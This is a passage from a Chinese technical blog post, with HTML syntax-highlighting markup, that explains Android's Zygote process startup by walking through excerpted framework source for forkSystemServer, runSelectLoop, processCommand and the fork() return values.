class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建zygote的socket</span></span><br><span class="line">ZygoteServer(<span class="type">boolean</span> isPrimaryZygote) &#123;</span><br><span class="line">    mUsapPoolEventFD = Zygote.getUsapPoolEventFD();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (isPrimaryZygote) &#123;</span><br><span class="line">        <span class="comment">//创建socket，并获取socket对象，socketname：zygote</span></span><br><span class="line">        mZygoteSocket = Zygote.createManagedSocketFromInitSocket(Zygote.PRIMARY_SOCKET_NAME);</span><br><span class="line">        mUsapPoolSocket =</span><br><span class="line">                Zygote.createManagedSocketFromInitSocket(</span><br><span class="line">                        Zygote.USAP_POOL_PRIMARY_SOCKET_NAME);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//socketname：zygote_secondary</span></span><br><span class="line">        mZygoteSocket = Zygote.createManagedSocketFromInitSocket(Zygote.SECONDARY_SOCKET_NAME);</span><br><span class="line">        mUsapPoolSocket =</span><br><span class="line">                Zygote.createManagedSocketFromInitSocket(</span><br><span class="line">                        Zygote.USAP_POOL_SECONDARY_SOCKET_NAME);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    mUsapPoolSupported = <span class="literal">true</span>;</span><br><span class="line">    fetchUsapPoolPolicyProps();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入到ZygoteInit.java#forkSystemServer()<br><strong>frameworks/base/core/java/com/android/internal/os/ZygoteInit.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Runnable <span class="title function_">forkSystemServer</span><span class="params">(String abiList, String socketName,</span></span><br><span class="line"><span class="params">        ZygoteServer zygoteServer)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">capabilities</span> <span class="operator">=</span> posixCapabilitiesAsBits(</span><br><span class="line">            OsConstants.CAP_IPC_LOCK,</span><br><span class="line">            OsConstants.CAP_KILL,</span><br><span class="line">            OsConstants.CAP_NET_ADMIN,</span><br><span class="line">            OsConstants.CAP_NET_BIND_SERVICE,</span><br><span class="line">            OsConstants.CAP_NET_BROADCAST,</span><br><span class="line">            OsConstants.CAP_NET_RAW,</span><br><span class="line">            OsConstants.CAP_SYS_MODULE,</span><br><span class="line">            OsConstants.CAP_SYS_NICE,</span><br><span class="line">            OsConstants.CAP_SYS_PTRACE,</span><br><span class="line">            OsConstants.CAP_SYS_TIME,</span><br><span class="line">            OsConstants.CAP_SYS_TTY_CONFIG,</span><br><span class="line">            OsConstants.CAP_WAKE_ALARM,</span><br><span class="line">            OsConstants.CAP_BLOCK_SUSPEND</span><br><span class="line">    );</span><br><span class="line">    ....</span><br><span class="line">    <span class="comment">//准备参数</span></span><br><span class="line">    <span class="comment">/* Hardcoded command line to start the system server */</span></span><br><span class="line">    String[] args = &#123;</span><br><span class="line">            <span class="string">&quot;--setuid=1000&quot;</span>,</span><br><span class="line">            <span class="string">&quot;--setgid=1000&quot;</span>,</span><br><span class="line">            <span class="string">&quot;--setgroups=1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1018,1021,1023,&quot;</span></span><br><span class="line">                    + <span class="string">&quot;1024,1032,1065,3001,3002,3003,3006,3007,3009,3010,3011&quot;</span>,</span><br><span class="line">            <span class="string">&quot;--capabilities=&quot;</span> + capabilities + <span class="string">&quot;,&quot;</span> + capabilities,</span><br><span class="line">            <span class="string">&quot;--nice-name=system_server&quot;</span>,</span><br><span class="line">            <span class="string">&quot;--runtime-args&quot;</span>,</span><br><span class="line">            <span class="string">&quot;--target-sdk-version=&quot;</span> + VMRuntime.SDK_VERSION_CUR_DEVELOPMENT,</span><br><span class="line">            <span class="string">&quot;com.android.server.SystemServer&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    ZygoteArguments parsedArgs;</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ZygoteCommandBuffer</span> <span class="variable">commandBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZygoteCommandBuffer</span>(args);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//将上面准备的参数，按照ZygoteArguments的风格进行封装</span></span><br><span class="line">            parsedArgs = ZygoteArguments.getInstance(commandBuffer);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (EOFException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Unexpected argument error for forking system server&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        commandBuffer.close();</span><br><span class="line">        Zygote.applyDebuggerSystemProperty(parsedArgs);</span><br><span class="line">        Zygote.applyInvokeWithSystemProperty(parsedArgs);</span><br><span class="line"> </span><br><span class="line">    .....</span><br><span class="line">        <span class="comment">//通过fork“分裂”出子进程system_server</span></span><br><span class="line">        <span class="comment">/* Request to fork the system server process */</span></span><br><span class="line">        pid = Zygote.forkSystemServer(</span><br><span class="line">                parsedArgs.mUid, parsedArgs.mGid,</span><br><span class="line">                parsedArgs.mGids,</span><br><span class="line">                parsedArgs.mRuntimeFlags,</span><br><span class="line">                <span class="literal">null</span>,</span><br><span class="line">                parsedArgs.mPermittedCapabilities,</span><br><span class="line">                parsedArgs.mEffectiveCapabilities);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//进入子进程system_server</span></span><br><span class="line">    <span class="comment">/* For child process */</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 处理32_64和64_32的情况</span></span><br><span class="line">        <span class="keyword">if</span> (hasSecondZygote(abiList)) &#123;</span><br><span class="line">            waitForSecondaryZygote(socketName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// fork时会copy socket，system server需要主动关闭</span></span><br><span class="line">        zygoteServer.closeServerSocket();</span><br><span class="line">        <span class="comment">// system server进程处理自己的工作</span></span><br><span class="line">        <span class="keyword">return</span> handleSystemServerProcess(parsedArgs);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要时调用了Zygote.java#forkSystemServer()方法，在这个方法中调用了Native的方法，但最后会调用fork()方法创建子进程。<br>fork()函数得到的子进程是父进程的一个复制品，通过写时拷贝实现。<br>fork调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次。<br>返回值：</p><ul><li>返回0：表示成功创建子进程，并且接下来进入子进程执行liuc</li><li>返回&gt;0：表示成功创建子进程，并且急促执行父进程流程代码</li><li>返回非正数&lt;0：表示创建子进程失败，失败的原因主要有：进程数超过了系统所能创建的上线，errno会被设置为EAGAIN系统内存不足，errno会被设置为ENOMEM</li></ul><p>回到ZygoteServer()方法中，在新fork出的子进程中调用了handleSystemServerProcess()，主要是返回Runtime.java的MethodAndArgsCaller的方法，然后通过r.run() 启动com.android.server.SystemServer的main 方法。<br>这个当我们后面的SystemServer的章节进行详细讲解。<br><strong>handleSystemServerProcess代码流程：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">handleSystemServerProcess()</span><br><span class="line">    |</span><br><span class="line">    [ZygoteInit.java]</span><br><span class="line">    zygoteInit()</span><br><span class="line">        |</span><br><span class="line">    [RuntimeInit.java]</span><br><span class="line">    applicationInit()</span><br><span class="line">        |</span><br><span class="line">    findStaticMain()</span><br><span class="line">        |</span><br><span class="line">    MethodAndArgsCaller()</span><br></pre></td></tr></table></figure><p><strong>进入ZygoteServer.java#runSelectLoop()</strong><br>说明：使zygote进程进入无限循环，处理请求<br><strong>frameworks/base/core/java/com/android/internal/os/ZygoteServer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line">Runnable <span class="title function_">runSelectLoop</span><span class="params">(String abiList)</span> &#123;</span><br><span class="line">    ArrayList&lt;FileDescriptor&gt; socketFDs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    ArrayList&lt;ZygoteConnection&gt; peers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//将server socket加入到fds</span></span><br><span class="line">    socketFDs.add(mZygoteSocket.getFileDescriptor());</span><br><span class="line">    peers.add(<span class="literal">null</span>);</span><br><span class="line"> </span><br><span class="line">    mUsapPoolRefillTriggerTimestamp = INVALID_TIMESTAMP;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        fetchUsapPoolPolicyPropsWithMinInterval();</span><br><span class="line">        mUsapPoolRefillAction = UsapPoolRefillAction.NONE;</span><br><span class="line"> </span><br><span class="line">        <span class="type">int</span>[] usapPipeFDs = <span class="literal">null</span>;</span><br><span class="line">        StructPollfd[] pollFDs;</span><br><span class="line">        <span class="comment">//每次循环，都重新创建需要监听的pollFds</span></span><br><span class="line">        <span class="keyword">if</span> (mUsapPoolEnabled) &#123;</span><br><span class="line">            usapPipeFDs = Zygote.getUsapPipeFDs();</span><br><span class="line">            pollFDs = <span class="keyword">new</span> <span class="title class_">StructPollfd</span>[socketFDs.size() + <span class="number">1</span> + usapPipeFDs.length];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pollFDs = <span class="keyword">new</span> <span class="title class_">StructPollfd</span>[socketFDs.size()];</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="type">int</span> <span class="variable">pollIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (FileDescriptor socketFD : socketFDs) &#123;</span><br><span class="line">            <span class="comment">//关注事件到来</span></span><br><span class="line">            pollFDs[pollIndex] = <span class="keyword">new</span> <span class="title class_">StructPollfd</span>();</span><br><span class="line">            pollFDs[pollIndex].fd = socketFD;</span><br><span class="line">            pollFDs[pollIndex].events = (<span class="type">short</span>) POLLIN;</span><br><span class="line">            ++pollIndex;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">usapPoolEventFDIndex</span> <span class="operator">=</span> pollIndex;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (mUsapPoolEnabled) &#123;</span><br><span class="line">            pollFDs[pollIndex] = <span class="keyword">new</span> <span class="title class_">StructPollfd</span>();</span><br><span class="line">            pollFDs[pollIndex].fd = mUsapPoolEventFD;</span><br><span class="line">            pollFDs[pollIndex].events = (<span class="type">short</span>) POLLIN;</span><br><span class="line">            ++pollIndex;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// The usapPipeFDs array will always be filled in if the USAP Pool is enabled.</span></span><br><span class="line">            <span class="keyword">assert</span> usapPipeFDs != <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> usapPipeFD : usapPipeFDs) &#123;</span><br><span class="line">                <span class="type">FileDescriptor</span> <span class="variable">managedFd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileDescriptor</span>();</span><br><span class="line">                managedFd.setInt$(usapPipeFD);</span><br><span class="line"> </span><br><span class="line">                pollFDs[pollIndex] = <span class="keyword">new</span> <span class="title class_">StructPollfd</span>();</span><br><span class="line">                pollFDs[pollIndex].fd = managedFd;</span><br><span class="line">                pollFDs[pollIndex].events = (<span class="type">short</span>) POLLIN;</span><br><span class="line">                ++pollIndex;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="type">int</span> pollTimeoutMs;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (mUsapPoolRefillTriggerTimestamp == INVALID_TIMESTAMP) &#123;</span><br><span class="line">            pollTimeoutMs = -<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">elapsedTimeMs</span> <span class="operator">=</span> System.currentTimeMillis() - mUsapPoolRefillTriggerTimestamp;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (elapsedTimeMs &gt;= mUsapPoolRefillDelayMs) &#123;</span><br><span class="line">                <span class="comment">// The refill delay has elapsed during the period between poll invocations.</span></span><br><span class="line">                <span class="comment">// We will now check for any currently ready file descriptors before refilling</span></span><br><span class="line">                <span class="comment">// the USAP pool.</span></span><br><span class="line">                pollTimeoutMs = <span class="number">0</span>;</span><br><span class="line">                mUsapPoolRefillTriggerTimestamp = INVALID_TIMESTAMP;</span><br><span class="line">                mUsapPoolRefillAction = UsapPoolRefillAction.DELAYED;</span><br><span class="line"> </span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (elapsedTimeMs &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// This can occur if the clock used by currentTimeMillis is reset, which is</span></span><br><span class="line">                <span class="comment">// possible because it is not guaranteed to be monotonic.  Because we can&#x27;t tell</span></span><br><span class="line">                <span class="comment">// how far back the clock was set the best way to recover is to simply re-start</span></span><br><span class="line">                <span class="comment">// the respawn delay countdown.</span></span><br><span class="line">                pollTimeoutMs = mUsapPoolRefillDelayMs;</span><br><span class="line"> </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                pollTimeoutMs = (<span class="type">int</span>) (mUsapPoolRefillDelayMs - elapsedTimeMs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="type">int</span> pollReturnValue;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//等待事件到来</span></span><br><span class="line">            pollReturnValue = Os.poll(pollFDs, pollTimeoutMs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ErrnoException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;poll failed&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (pollReturnValue == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// The poll returned zero results either when the timeout value has been exceeded</span></span><br><span class="line">            <span class="comment">// or when a non-blocking poll is issued and no FDs are ready.  In either case it</span></span><br><span class="line">            <span class="comment">// is time to refill the pool.  This will result in a duplicate assignment when</span></span><br><span class="line">            <span class="comment">// the non-blocking poll returns zero results, but it avoids an additional</span></span><br><span class="line">            <span class="comment">// conditional in the else branch.</span></span><br><span class="line">            mUsapPoolRefillTriggerTimestamp = INVALID_TIMESTAMP;</span><br><span class="line">            mUsapPoolRefillAction = UsapPoolRefillAction.DELAYED;</span><br><span class="line"> </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">usapPoolFDRead</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="comment">//倒序处理，即优先处理已建立链接的信息，后处理新建链接的请求</span></span><br><span class="line">            <span class="keyword">while</span> (--pollIndex &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((pollFDs[pollIndex].revents &amp; POLLIN) == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//server socket最先加入fds，因此这里是server socket收到数据</span></span><br><span class="line">                <span class="keyword">if</span> (pollIndex == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// Zygote server socket</span></span><br><span class="line">                    <span class="comment">//收到新的建立通信的请求，建立通信连接</span></span><br><span class="line">                    <span class="type">ZygoteConnection</span> <span class="variable">newPeer</span> <span class="operator">=</span> acceptCommandPeer(abiList);</span><br><span class="line">                    <span class="comment">//加入到peers和fds，即下一次也开监听</span></span><br><span class="line">                    peers.add(newPeer);</span><br><span class="line">                    socketFDs.add(newPeer.getFileDescriptor());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pollIndex &lt; usapPoolEventFDIndex) &#123;</span><br><span class="line">                    <span class="comment">// Session socket accepted from the Zygote server socket</span></span><br><span class="line">                    <span class="comment">//说明接收AMS发送过来创建应用程序的请求，调用processOneCommand来创建新的应用程序进程</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//有socket连接，创建ZygoteConnection对象，并添加到fds</span></span><br><span class="line">                        <span class="type">ZygoteConnection</span> <span class="variable">connection</span> <span class="operator">=</span> peers.get(pollIndex);</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">multipleForksOK</span> <span class="operator">=</span> !isUsapPoolEnabled()</span><br><span class="line">                                &amp;&amp; ZygoteHooks.isIndefiniteThreadSuspensionSafe();</span><br><span class="line">                        <span class="comment">//处理连接</span></span><br><span class="line">                        <span class="keyword">final</span> <span class="type">Runnable</span> <span class="variable">command</span> <span class="operator">=</span></span><br><span class="line">                                connection.processCommand(<span class="built_in">this</span>, multipleForksOK);</span><br><span class="line"> </span><br><span class="line">                        <span class="comment">// TODO (chriswailes): Is this extra check necessary?</span></span><br><span class="line">                        <span class="keyword">if</span> (mIsForkChild) &#123;</span><br><span class="line">                            <span class="comment">// We&#x27;re in the child. We should always have a command to run at</span></span><br><span class="line">                            <span class="comment">// this stage if processCommand hasn&#x27;t called &quot;exec&quot;.</span></span><br><span class="line">                            <span class="keyword">if</span> (command == <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;command == null&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"> </span><br><span class="line">                            <span class="keyword">return</span> command;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// We&#x27;re in the server - we should never have any commands to run.</span></span><br><span class="line">                            <span class="keyword">if</span> (command != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;command != null&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"> </span><br><span class="line">                            <span class="comment">// We don&#x27;t know whether the remote side of the socket was closed or</span></span><br><span class="line">                            <span class="comment">// not until we attempt to read from it from processCommand. This</span></span><br><span class="line">                            <span class="comment">// shows up as a regular POLLIN event in our regular processing</span></span><br><span class="line">                            <span class="comment">// loop.</span></span><br><span class="line">                            <span class="keyword">if</span> (connection.isClosedByPeer()) &#123;</span><br><span class="line">                                connection.closeSocket();</span><br><span class="line">                                peers.remove(pollIndex);</span><br><span class="line">                                socketFDs.remove(pollIndex);<span class="comment">//处理完则从fds中移除该文件描述符</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        ......</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="comment">// Reset the child flag, in the event that the child process is a child-</span></span><br><span class="line">                        <span class="comment">// zygote. The flag will not be consulted this loop pass after the</span></span><br><span class="line">                        <span class="comment">// Runnable is returned.</span></span><br><span class="line">                        mIsForkChild = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"> </span><br><span class="line">                &#125;</span><br><span class="line">                    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>processOneCommand()<br><strong>frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Runnable <span class="title function_">processCommand</span><span class="params">(ZygoteServer zygoteServer, <span class="type">boolean</span> multipleOK)</span> &#123;</span><br><span class="line">.....</span><br><span class="line">            <span class="keyword">if</span> (parsedArgs.mInvokeWith != <span class="literal">null</span> || parsedArgs.mStartChildZygote</span><br><span class="line">                    || !multipleOK || peer.getUid() != Process.SYSTEM_UID) &#123;</span><br><span class="line">                <span class="comment">// Continue using old code for now. <span class="doctag">TODO:</span> Handle these cases in the other path.</span></span><br><span class="line">                <span class="comment">//fork子进程</span></span><br><span class="line">                pid = Zygote.forkAndSpecialize(parsedArgs.mUid, parsedArgs.mGid,</span><br><span class="line">                        parsedArgs.mGids, parsedArgs.mRuntimeFlags, rlimits,</span><br><span class="line">                        parsedArgs.mMountExternal, parsedArgs.mSeInfo, parsedArgs.mNiceName,</span><br><span class="line">                        fdsToClose, fdsToIgnore, parsedArgs.mStartChildZygote,</span><br><span class="line">                        parsedArgs.mInstructionSet, parsedArgs.mAppDataDir,</span><br><span class="line">                        parsedArgs.mIsTopApp, parsedArgs.mPkgDataInfoList,</span><br><span class="line">                        parsedArgs.mAllowlistedDataInfoList, parsedArgs.mBindMountAppDataDirs,</span><br><span class="line">                        parsedArgs.mBindMountAppStorageDirs);</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// in child</span></span><br><span class="line">                        <span class="comment">//子进程执行</span></span><br><span class="line">                        zygoteServer.setForkChild();</span><br><span class="line">    </span><br><span class="line">                        zygoteServer.closeServerSocket();</span><br><span class="line">                        IoUtils.closeQuietly(serverPipeFd);</span><br><span class="line">                        serverPipeFd = <span class="literal">null</span>;</span><br><span class="line">                        <span class="comment">//进入子进程流程</span></span><br><span class="line">                        <span class="keyword">return</span> handleChildProc(parsedArgs, childPipeFd,</span><br><span class="line">                                parsedArgs.mStartChildZygote);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// In the parent. A pid &lt; 0 indicates a failure and will be handled in</span></span><br><span class="line">                        <span class="comment">// handleParentProc.</span></span><br><span class="line">                        <span class="comment">//父进程执行</span></span><br><span class="line">                        IoUtils.closeQuietly(childPipeFd);</span><br><span class="line">                        childPipeFd = <span class="literal">null</span>;</span><br><span class="line">                        handleParentProc(pid, serverPipeFd);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handleChildProc()<br><strong>frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 